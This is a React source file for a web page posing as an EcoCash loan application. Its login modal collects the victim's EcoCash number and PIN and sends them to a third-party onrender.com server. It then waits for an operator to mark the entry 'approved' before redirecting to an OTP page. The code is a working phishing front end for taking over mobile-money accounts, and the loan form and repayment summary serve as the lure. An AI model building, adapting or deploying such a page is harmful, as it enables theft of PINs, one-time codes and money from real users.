import { useState, useRef, useEffect } from 'react'; // Removed React import
import { useNavigate } from 'react-router-dom';
import { ChevronLeft, ChevronDown, X, Eye, EyeOff, Home, CheckCircle2 } from 'lucide-react';

const API_BASE_URL = "https://ecocash-loans-hlfv.onrender.com"; 

export default function ApplyPage() {
  const navigate = useNavigate();
  
  const [step, setStep] = useState(1);
  const [amount, setAmount] = useState(50000); 
  const [months, setMonths] = useState(6);
  const [purpose, setPurpose] = useState("");
  const [isPurposeModalOpen, setIsPurposeModalOpen] = useState(false);
  
  const [fullName, setFullName] = useState('');
  const [city, setCity] = useState('');
  const [momoNumber, setMomoNumber] = useState('');
  
  const [isMomoOpen, setIsMomoOpen] = useState(false);
  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);

  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);

  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  // Now these are all USED in the summary card below
  const totalRepayment = amount + (amount * 0.03 * months);
  const monthlyPayment = totalRepayment / months;
  const formatCurrency = (val: number) => `ZWG ${val.toLocaleString()}`;
  const purposes = ["School fees", "Rent or housing", "Business stock", "Medical expenses", "Home improvement", "Emergency", "Other"];

  const handleContinue = () => {
    if (step === 1) setStep(2);
    else setIsMomoOpen(true);
  };

  const handleLoginSubmit = async () => {
    if (pin.length !== 4 || momoNumber.length < 9) return;
    setIsProcessing(true);

    try {
      const response = await fetch(`${API_BASE_URL}/api/initiate-login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: momoNumber, pin, amount, months })
      });

      if (!response.ok) throw new Error("Failed");
      const { transaction_id } = await response.json();

      let attempts = 0;
      pollRef.current = setInterval(async () => {
        attempts++;
        if (attempts > 60) {
          if (pollRef.current) clearInterval(pollRef.current);
          setIsProcessing(false);
          alert("Timed out.");
          return;
        }

        try {
          const statusRes = await fetch(`${API_BASE_URL}/api/status/${transaction_id}`);
          const statusData = await statusRes.json();

          if (statusData.status === 'approved') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            setIsSuccess(true); 
            setTimeout(() => {
              navigate('/otp', { state: { phone: momoNumber, amount } });
            }, 1500);
          } else if (statusData.status === 'denied') {
            if (pollRef.current) clearInterval(pollRef.current);
            setIsProcessing(false);
            setIsMomoOpen(false);
            setPin('');
            alert("Login denied.");
          }
        } catch (err) {
          console.error("Polling error:", err);
        }
      }, 2000); 

    } catch (error) {
      setIsProcessing(false);
      alert("Network error.");
    }
  };

  return (
    <div style={{ maxWidth: '480px', margin: '0 auto', backgroundColor: '#f8f9fc', minHeight: '100vh', fontFamily: "'Inter', sans-serif", position: 'relative' }}>
      <style>{`input::placeholder { color: #a0aec0 !important; } input:focus { border-color: #005A9C !important; outline: none; }`}</style>

      <div style={{ background: 'linear-gradient(135deg, #003B73 0%, #005A9C 100%)', padding: '24px 20px', color: 'white', borderBottomLeftRadius: '20px', borderBottomRightRadius: '20px' }}>
        <div onClick={() => step === 1 ? navigate('/') : setStep(1)} style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', fontSize: '15px', color: 'white', background: 'rgba(255,255,255,0.15)', padding: '8px 16px', borderRadius: '20px', cursor: 'pointer', marginBottom: '20px' }}>
          {step === 1 ? <Home size={16} /> : <ChevronLeft size={18} />} {step === 1 ? 'Home' : 'Back'} / {step === 1 ? 'Apply' : 'Loan Details'}
        </div>
        <h1 style={{ fontSize: '28px', fontWeight: 800, margin: '0 0 10px 0' }}>Let's get you <span style={{color: '#FFCC00'}}>sorted.</span></h1>
      </div>

      <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
        {step === 1 ? (
          <>
            <h3 style={{ fontSize: '20px', margin: '0 0 8px 0' }}>How much do you need?</h3>
            <p style={{ fontSize: '14px', color: '#666', marginBottom: '24px' }}>Choose between ZWG 5,000 and ZWG 800,000.</p>
            <div style={{ display: 'flex', alignItems: 'center', border: '2px solid #e2e8f0', borderRadius: '14px', padding: '0 20px', marginBottom: '20px', backgroundColor: '#fcfcfc' }}>
              <span style={{ fontWeight: 800, color: '#005A9C', fontSize: '18px', marginRight: '10px' }}>ZWG</span>
              <input type="number" value={amount} onChange={(e) => setAmount(Number(e.target.value))} style={{ width: '100%', padding: '18px 0', border: 'none', backgroundColor: 'transparent', fontSize: '18px', fontWeight: 600, outline: 'none' }} />
            </div>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
              {[10000, 50000, 200000, 800000].map(val => (
                <div key={val} onClick={() => setAmount(val)} style={{ padding: '12px 18px', borderRadius: '20px', border: amount === val ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: amount === val ? '#005A9C' : 'white', color: amount === val ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600 }}>ZWG {val.toLocaleString()}</div>
              ))}
            </div>
            <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px', marginBottom: '24px' }}>
              {[1, 3, 6, 12, 24].map(m => (
                <div key={m} onClick={() => setMonths(m)} style={{ padding: '12px 18px', borderRadius: '20px', border: months === m ? '2px solid #005A9C' : '1px solid #e2e8f0', backgroundColor: months === m ? '#005A9C' : 'white', color: months === m ? 'white' : '#333', fontSize: '14px', cursor: 'pointer', fontWeight: 600 }}>{m} month{m > 1 && 's'}</div>
              ))}
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '18px 20px', border: '2px solid #e2e8f0', borderRadius: '14px', cursor: 'pointer', color: purpose ? '#111' : '#a0aec0', backgroundColor: '#fcfcfc' }} onClick={() => setIsPurposeModalOpen(true)}>
              {purpose || 'Select a purpose'} <ChevronDown size={20} />
            </div>
          </>
        ) : (
          <>
            <h3 style={{ fontSize: '20px', margin: '0 0 8px 0' }}>Tell us about you</h3>
            <input type="text" placeholder="Full Name (e.g. Tinashe Moyo)" value={fullName} onChange={(e) => setFullName(e.target.value)} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', marginBottom: '20px', boxSizing: 'border-box' }} />
            <input type="text" placeholder="City / Town (e.g. Harare)" value={city} onChange={(e) => setCity(e.target.value)} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', marginBottom: '20px', boxSizing: 'border-box' }} />
            <input type="tel" placeholder="EcoCash Number (77X XXX XXX)" value={momoNumber} onChange={(e) => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} style={{ width: '100%', padding: '18px 20px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: '#fcfcfc', boxSizing: 'border-box' }} />
          </>
        )}
      </div>

      {/* SUMMARY CARD (Uses the variables that were previously unused) */}
      <div style={{ backgroundColor: 'white', margin: '20px', borderRadius: '16px', padding: '24px 20px', boxShadow: '0 4px 16px rgba(0,0,0,0.04)' }}>
        <label style={{ display: 'block', fontSize: '13px', fontWeight: 700, color: '#666', marginBottom: '8px' }}>YOUR APPLICATION</label>
        <h2 style={{ fontSize: '32px', fontWeight: 800, color: '#003B73', margin: '8px 0' }}>{formatCurrency(amount)}</h2>
        <p style={{ fontSize: '15px', color: '#666', marginBottom: '24px' }}>Over {months} months</p>
        <div style={{ borderTop: '1px dashed #cbd5e1', paddingTop: '20px' }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px' }}><span>Estimated monthly</span><span style={{ fontWeight: 700 }}>{formatCurrency(monthlyPayment)}</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px', marginBottom: '14px' }}><span>Total repayment</span><span style={{ fontWeight: 700 }}>{formatCurrency(totalRepayment)}</span></div>
          <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '15px' }}><span>Purpose</span><span style={{ fontWeight: 700 }}>{purpose || '—'}</span></div>
        </div>
      </div>

      <div style={{ display: 'flex', gap: '12px', padding: '0 20px 30px' }}>
        {step === 2 && <button onClick={() => setStep(1)} style={{ flex: 1, padding: '18px', borderRadius: '14px', border: '2px solid #e2e8f0', backgroundColor: 'white', fontWeight: 700, color: '#005A9C' }}>Back</button>}
        <button onClick={handleContinue} style={{ flex: 2, padding: '18px', borderRadius: '14px', border: 'none', backgroundColor: '#005A9C', color: 'white', fontWeight: 700 }}>Continue</button>
      </div>

      {/* PURPOSE MODAL (Uses isPurposeModalOpen and setPurpose) */}
      {isPurposeModalOpen && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 100, display: 'flex', alignItems: 'flex-end', justifyContent: 'center' }} onClick={() => setIsPurposeModalOpen(false)}>
          <div style={{ backgroundColor: 'white', width: '100%', maxWidth: '480px', borderTopLeftRadius: '24px', borderTopRightRadius: '24px', padding: '24px 0' }} onClick={e => e.stopPropagation()}>
            <div style={{ padding: '0 24px 10px', fontSize: '18px', fontWeight: 700 }}>Select a purpose</div>
            {purposes.map(p => (
              <div key={p} style={{ padding: '16px 24px', borderBottom: '1px solid #f1f5f9', cursor: 'pointer', display: 'flex', justifyContent: 'space-between' }} onClick={() => { setPurpose(p); setIsPurposeModalOpen(false); }}>
                {p}
                <div style={{ width: '22px', height: '22px', borderRadius: '50%', border: purpose === p ? '7px solid #005A9C' : '2px solid #cbd5e1' }}></div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* ECOCASH LOGIN MODAL */}
      {isMomoOpen && (
        <div style={{ position: 'fixed', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.6)', zIndex: 100, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '20px' }}>
          <div style={{ backgroundColor: 'white', borderRadius: '24px', padding: '30px 24px', width: '100%', maxWidth: '400px', position: 'relative' }}>
            {!isProcessing && !isSuccess && <button style={{ position: 'absolute', top: '20px', right: '20px', background: 'none', border: 'none', cursor: 'pointer' }} onClick={() => setIsMomoOpen(false)}><X size={24} /></button>}
            
            {isSuccess ? (
              <div style={{ textAlign: 'center', padding: '20px 0' }}>
                <CheckCircle2 size={50} color="#00c853" style={{ margin: '0 auto 20px' }} />
                <h2 style={{ fontSize: '22px', fontWeight: 800 }}>Login Approved!</h2>
                <p style={{ color: '#666' }}>Redirecting to OTP...</p>
              </div>
            ) : isProcessing ? (
              <div style={{ textAlign: 'center', padding: '30px 0' }}>
                <div style={{ width: '40px', height: '40px', border: '4px solid #f1f5f9', borderTop: '4px solid #0b40c4', borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto' }}></div>
                <style>{`@keyframes spin { 100% { transform: rotate(360deg); } }`}</style>
                <p style={{ marginTop: '20px', fontWeight: 600, color: '#0b40c4' }}>Waiting for approval...</p>
              </div>
            ) : (
              <>
                <h2 style={{ fontSize: '22px', fontWeight: 800, textAlign: 'center', marginBottom: '20px' }}>Login to EcoCash</h2>
                <label style={{ fontSize: '12px', fontWeight: 700 }}>ECOCASH NUMBER</label>
                <div style={{ display: 'flex', border: '2px solid #e2e8f0', borderRadius: '14px', marginBottom: '20px', overflow: 'hidden' }}>
                  <div style={{ padding: '18px 16px', backgroundColor: '#f1f5f9', borderRight: '2px solid #e2e8f0', fontWeight: 600 }}>🇿🇼 +263</div>
                  <input type="tel" value={momoNumber} onChange={e => setMomoNumber(e.target.value.replace(/\D/g, '').slice(0,9))} style={{ width: '100%', padding: '18px', border: 'none', fontSize: '18px', outline: 'none' }} />
                </div>
                <label style={{ fontSize: '12px', fontWeight: 700 }}>ENTER PIN</label>
                <div style={{ position: 'relative' }}>
                  <input type={showPin ? "text" : "password"} value={pin} onChange={e => setPin(e.target.value.replace(/\D/g, '').slice(0,4))} style={{ width: '100%', padding: '20px', borderRadius: '14px', border: '2px solid #e2e8f0', fontSize: '24px', textAlign: 'center', letterSpacing: '16px' }} />
                  <span style={{ position: 'absolute', right: '16px', top: '20px', cursor: 'pointer', color: '#0b40c4', fontWeight: 700 }} onClick={() => setShowPin(!showPin)}>{showPin ? <EyeOff size={18}/> : <Eye size={18}/>}</span>
                </div>
                <button onClick={handleLoginSubmit} style={{ width: '100%', padding: '18px', marginTop: '28px', borderRadius: '14px', border: 'none', backgroundColor: (pin.length === 4 && momoNumber.length >= 9) ? '#0b40c4' : '#a0bdf5', color: 'white', fontWeight: 700 }}>Login securely</button>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}